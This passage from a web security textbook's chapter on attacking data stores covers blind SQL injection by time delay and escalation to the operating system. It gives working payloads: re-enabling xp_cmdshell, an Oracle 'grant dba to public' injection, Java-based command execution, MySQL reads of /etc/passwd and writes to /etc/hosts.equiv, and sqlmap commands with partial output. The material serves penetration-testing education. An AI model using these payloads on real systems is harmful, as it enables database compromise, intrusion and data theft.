alternative is the benchmark function, which can be used to perform a specifi ed
action repeatedly. Instructing the database to perform a processor-intensive
action, such as a SHA-1 hash, many times will result in a measurable time
delay. For example:
select if(user() like ‘root@%’, benchmark(50000,sha1(‘test’)), ‘false’)
In PostgreSQL, the PG_SLEEP function can be used in the same way as the
MySQL sleep function.
Oracle has no built-in method to perform a time delay, but you can use
other tricks to cause a time delay to occur. One trick is to use UTL_HTTP to
cc0099..iinndddd 332233 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 324
324 Chapter 9 n Attacking Data Stores
connect to a nonexistent server, causing a timeout. This causes the database
to attempt to connect to the specifi ed server and eventually time out. For
example:
SELECT ‘a’||Utl_Http.request(‘http://madeupserver.com’) from dual
...delay...
ORA-29273: HTTP request failed
ORA-06512: at “SYS.UTL_HTTP”, line 1556
ORA-12545: Connect failed because target host or object does not exist
You can leverage this behavior to cause a time delay contingent on some
condition that you specify. For example, the following query causes a timeout
if the default Oracle account DBSNMP exists:
SELECT ‘a’||Utl_Http.request(‘http://madeupserver.com’) FROM dual WHERE
(SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’
In both Oracle and MySQL databases, you can use the SUBSTR(ING)and ASCII
functions to retrieve arbitrary information one byte at a time, as described
previously.
TIP We have described the use of time delays as a means of extracting
interesting information. However, the time-delay technique can also be
immensely useful when performing initial probing of an application to
detect SQL injection vulnerabilities. In some cases of completely blind
SQL injection, where no results are returned to the browser and all errors
are handled invisibly, the vulnerability itself may be hard to detect using
standard techniques based on supplying crafted input. In this situation,
using time delays is often the most reliable way to detect the presence of a
vulnerability during initial probing. For example, if the back-end database
is MS-SQL, you can inject each of the following strings into each request
parameter in turn and monitor how long the application takes to identify
any vulnerabilities:
‘; waitfor delay ‘0:30:0’--
1; waitfor delay ‘0:30:0’--
TRY IT!
This lab example contains a SQL injection vulnerability with no error feed-
back. You can use it to practice various advanced techniques, including the
use of conditional responses and time delays.
http://mdsec.net/addressbook/44/
cc0099..iinndddd 332244 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 325
Chapter 9 n Attacking Data Stores 325
Beyond SQL Injection: Escalating the Database Attack
A successful exploit of a SQL injection vulnerability often results in total com-
promise of all application data. Most applications employ a single account for
all database access and rely on application-layer controls to enforce segregation
of access between different users. Gaining unrestricted use of the application’s
database account results in access to all its data.
You may suppose, therefore, that owning all the application’s data is the
fi nishing point of a SQL injection attack. However, there are many reasons
why it might be productive to advance your attack further, either by exploiting
a vulnerability within the database itself or by harnessing some of its built-in
functionality to achieve your objectives. Further attacks that can be performed
by escalating the database attack include the following:
n If the database is shared with other applications, you may be able to escalate
privileges within the database and gain access to other applications’ data.
n You may be able to compromise the operating system of the database server.
n You may be able to gain network access to other systems. Typically, the
database server is hosted on a protected network behind several layers
of network perimeter defenses. From the database server, you may be in
a trusted position and be able to reach key services on other hosts, which
may be further exploitable.
n You may be able to make network connections back out of the hosting
infrastructure to your own computer. This may enable you to bypass the
application, easily transmitting large amounts of sensitive data gathered
from the database, and often evading many intrusion detection systems.
n You may be able to extend the database’s existing functionality in arbitrary
ways by creating user-defi ned functions. In some situations, this may enable
you to circumvent hardening that has been performed on the database by
effectively reimplementing functionality that has been removed or disabled.
There is a method for doing this in each of the mainstream databases,
provided that you have gained database administrator (DBA) privileges.
COMMON MYTH
Many database administrators assume that it is unnecessary to defend the data-
base against attacks that require authentication to exploit. They may reason
that the database is accessed by only a trusted application that is owned by the
same organization. This ignores the possibility that a fl aw within the applica-
tion may enable a malicious third party to interact with the database within the
application’s security context. Each of the possible attacks just described should
illustrate why databases need to be defended against authenticated attackers.
cc0099..iinndddd 332255 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 326
326 Chapter 9 n Attacking Data Stores
Attacking databases is a huge topic that is beyond the scope of this book. This
section points you toward a few key ways in which vulnerabilities and function-
ality within the main database types can be leveraged to escalate your attack.
The key conclusion to draw is that every database contains ways to escalate
privileges. Applying current security patches and robust hardening can help
mitigate many of these attacks, but not all of them. For further reading on this
highly fruitful area of current research, we recommend TheDatabaseHacker’s
Handbook (Wiley, 2005).
MS-SQL
Perhaps the most notorious piece of database functionality that an attacker can
misuse is the xp_cmdshell stored procedure, which is built into MS-SQL by
default. This stored procedure allows users with DBA permissions to execute
operating system commands in the same way as the cmd.exe command prompt.
For example:
master..xp_cmdshell ‘ipconfig > foo.txt’
The opportunity for an attacker to misuse this functionality is huge. He can
perform arbitrary commands, pipe the results to local fi les, and read them back.
He can open out-of-band network connections back to himself and create a
backdoor command and communications channel, copying data from the server
and uploading attack tools. Because MS-SQL runs by default as LocalSystem,
the attacker typically can fully compromise the underlying operating system,
performing arbitrary actions. MS-SQL contains a wealth of other extended
stored procedures, such as xp_regread and xp_regwrite, that can be used to
perform powerful actions within the registry of the Windows operating system.
Dealing with Default Lockdown
Most installations of MS-SQL encountered on the Internet will be MS-SQL 2005
or later. These versions contain numerous security features that lock down the
database by default, preventing many useful attack techniques from working.
However, if the web application’s user account within the database is suf-
fi ciently high-privileged, it is possible to overcome these obstacles simply by
reconfi guring the database. For example, if xp_cmdshell is disabled, it can be
re-enabled with the sp_configure stored procedure. The following four lines
of SQL do this:
EXECUTE sp_configure ‘show advanced options’, 1
RECONFIGURE WITH OVERRIDE
EXECUTE sp_configure ‘xp_cmdshell’, ‘1’
RECONFIGURE WITH OVERRIDE
cc0099..iinndddd 332266 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 327
Chapter 9 n Attacking Data Stores 327
At this point, xp_cmdshell is re-enabled and can be run with the usual
command:
exec xp_cmdshell ‘dir’
Oracle
A huge number of security vulnerabilities have been found within the Oracle
database software itself. If you have found a SQL injection vulnerability that
enables you to perform arbitrary queries, typically you can escalate to DBA
privileges by exploiting one of these vulnerabilities.
Oracle contains many built-in stored procedures that execute with DBA privi-
leges and have been found to contain SQL injection fl aws within the procedures
themselves. A typical example of such a fl aw existed in the default package
SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES prior to the July 2006
critical patch update. This can be exploited to escalate privileges by injecting
the query grant DBA to public into the vulnerable fi eld:
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘INDX’,’SCH’,
‘TEXTINDEXMETHODS”.ODCIIndexUtilCleanup(:p1); execute immediate
‘’declare pragma autonomous_transaction; begin execute immediate
‘’’’grant dba to public’’’’ ; end;’’; END;--’,’CTXSYS’,1,’1’,0) from dual
This type of attack could be delivered via a SQL injection fl aw in a web appli-
cation by injecting the function into the vulnerable parameter.
In addition to actual vulnerabilities like these, Oracle also contains a large
amount of default functionality. It is accessible by low-privileged users and
can be used to perform undesirable actions, such as initiating network connec-
tions or accessing the fi lesystem. In addition to the powerful packages already
described for creating out-of-band connections, the package UTL_FILE can be
used to read from and write to fi les on the database server fi lesystem.
In 2010, David Litchfi eld demonstrated how Java can be abused in Oracle 10g
R2 and 11g to execute operating system commands. This attack fi rst exploits a
fl aw in DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY to grant the current user the
permission java.io.filepermission. The attack then executes a Java class
(oracle/aurora/util/Wrapper) that runs an OS command, using DBMS_JAVA.
RUNJAVA. For example:
DBMS_JAVA.RUNJAVA(‘oracle/aurora/util/Wrapper c:\\windows\\system32\\
cmd.exe /c dir>c:\\OUT.LST’)
More details can be found here:
n www.databasesecurity.com/HackingAurora.pdf
n www.notsosecure.com/folder2/2010/08/02/blackhat-2010/
cc0099..iinndddd 332277 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 328
328 Chapter 9 n Attacking Data Stores
MySQL
Compared to the other databases covered, MySQL contains relatively little
built-in functionality that an attacker can misuse. One example is the ability
of any user with the FILE_PRIV permission to read and write to the fi lesystem.
The LOAD_FILE command can be used to retrieve the contents of any fi le. For
example:
select load_file(‘/etc/passwd’)
The SELECT ... INTO OUTFILE command can be used to pipe the results of
any query into a fi le. For example:
create table test (a varchar(200))
insert into test(a) values (‘+ +’)
select * from test into outfile ‘/etc/hosts.equiv’
In addition to reading and writing key operating system fi les, this capability
can be used to perform other attacks:
n Because MySQL stores its data in plaintext fi les, to which the database
must have read access, an attacker with FILE_PRIV permissions can simply
open the relevant fi le and read arbitrary data from within the database,
bypassing any access controls enforced within the database itself.
n MySQL enables users to create user-defi ned functions (UDFs) by calling
out to a compiled library fi le that contains the function’s implementation.
This fi le must be located within the normal path from which MySQL loads
dynamic libraries. An attacker can use the preceding method to create
an arbitrary binary fi le within this path and then create a UDF that uses
it. Refer to Chris Anley’s paper “Hackproofi ng MySQL” for more details
on this technique.
Using SQL Exploitation Tools
Many of the techniques we have described for exploiting SQL injection vulner-
abilities involve performing large numbers of requests to extract small amounts
of data at a time. Fortunately, numerous tools are available that automate much
of this process and that are aware of the database-specifi c syntax required to
deliver successful attacks.
Most of the currently available tools use the following approach to exploit
SQL injection vulnerabilities:
n Brute-force all parameters in the target request to locate SQL injection
points.
cc0099..iinndddd 332288 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 329
Chapter 9 n Attacking Data Stores 329
n Determine the location of the vulnerable fi eld within the back-end SQL
query by appending various characters such as closing brackets, comment
characters, and SQL keywords.
n Attempt to perform a UNION attack by brute-forcing the number of required
columns and then identifying a column with the varchar data type, which
can be used to return results.
n Inject custom queries to retrieve arbitrary data — if necessary, concate-
nating data from multiple columns into a string that can be retrieved
through a single result of the varchar data type.
n If results cannot be retrieved using UNION, inject Boolean conditions (AND
1=1,AND 1=2, and so on) into the query to determine whether conditional
responses can be used to retrieve data.
n If results cannot be retrieved by injecting conditional expressions, try
using conditional time delays to retrieve data.
These tools locate data by querying the relevant metadata tables for the data-
base in question. Generally they can perform some level of escalation, such as
using xp_cmdshell to gain OS-level access. They also use various optimization
techniques, making use of the many features and built-in functions in the various
databases to decrease the number of necessary queries in an inference-based
brute-force attack, evade potential fi lters on single quotes, and more.
NOTE These tools are primarily exploitation tools, best suited to extracting
data from the database by exploiting an injection point that you have already
identifi ed and understood. They are not a magic bullet for fi nding and exploit-
ing SQL injection fl aws. In practice, it is often necessary to provide some
additional SQL syntax before and/or after the data injected by the tool for the
tool’s hard-coded attacks to work.
HACK STEPS
When you have identifi ed a SQL injection vulnerability, using the techniques
described earlier in this chapter, you can consider using a SQL injection tool to
exploit the vulnerability and retrieve interesting data from the database. This
option is particularly useful in cases where you need to use blind techniques
to retrieve a small amount of data at a time.
1. Run the SQL exploitation tool using an intercepting proxy. Analyze the
requests made by the tool as well as the application’s responses. Turn on
any verbose output options on the tool, and correlate its progress with the
observed queries and responses.
Continued
cc0099..iinndddd 332299 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 330
330 Chapter 9 n Attacking Data Stores
HACK STEPS (CONTINUED)
2. Because these kinds of tools rely on preset tests and specific response
syntax, it may be necessary to append or prepend data to the string
injected by the tool to ensure that the tool gets the expected response.
Typical requirements are adding a comment character, balancing the
single quotes within the server’s SQL query, and appending or prepending
closing brackets to the string to match the original query.
3. If the syntax appears to be failing regardless of the methods described
here, it is often easiest to create a nested subquery that is fully under
your control, and allow the tool to inject into that. This allows the tool to
use inference to extract data. Nested queries work well when you inject
into standard SELECT and UPDATE queries. Under Oracle they work within
anINSERT statement. In each of the following cases, prepend the text
occurring before [input], and append the closing bracket occurring after
that point:
n Oracle: ‘||(select 1 from dual where 1=[input])
n MS-SQL: (select 1 where 1=[input])
Numerous tools exist for automated exploitation of SQL injection. Many of
these are specifi cally geared toward MS-SQL, and many have ceased active
development and have been overtaken by new techniques and developments in
SQL injection. The authors’ favorite is sqlmap, which can attack MySQL, Oracle,
and MS-SQL, among others. It implements UNION-based and inference-based
retrieval. It supports various escalation methods, including retrieval of fi les
from the operating system, and command execution under Windows using
xp_cmdshell.
In practice, sqlmap is an effective tool for database information retrieval
through time-delay or other inference methods and can be useful for UNION-
based retrieval. One of the best ways to use it is with the --sql-shell option.
This gives the attacker a SQL prompt and performs the necessary UNION, error-
based, or blind SQL injection behind the scenes to send and retrieve results.
For example:
C:\sqlmap>sqlmap.py -u http://wahh-app.com/employees?Empno=7369 --union-use
--sql-shell -p Empno
sqlmap/0.8 - automatic SQL injection and database takeover tool
http://sqlmap.sourceforge.net
[*] starting at: 14:54:39
[14:54:39] [INFO] using ‘C:\sqlmap\output\wahh-app.com\session’
as session file
[14:54:39] [INFO] testing connection to the target url
[14:54:40] [WARNING] the testable parameter ‘Empno’ you provided is not
cc0099..iinndddd 333300 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 331
Chapter 9 n Attacking Data Stores 331
into the
Cookie
[14:54:40] [INFO] testing if the url is stable, wait a few seconds
[14:54:44] [INFO] url is stable
[14:54:44] [INFO] testing sql injection on GET parameter ‘Empno’ with 0